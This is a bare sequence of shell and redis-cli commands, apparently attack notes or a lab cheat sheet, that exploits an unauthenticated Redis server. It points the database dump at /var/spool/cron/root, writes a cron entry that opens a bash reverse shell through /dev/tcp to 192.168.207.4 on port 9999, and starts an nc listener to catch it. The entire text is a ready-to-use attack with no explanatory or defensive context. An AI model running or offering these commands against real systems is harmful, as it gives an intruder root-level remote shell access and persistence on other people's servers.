apt-get install redis -y
redis-cli -h 192.168.207.3
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
set payload "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.207.4/9999 0>&1\n\n"
Save
Exit
nc -l -p 9999
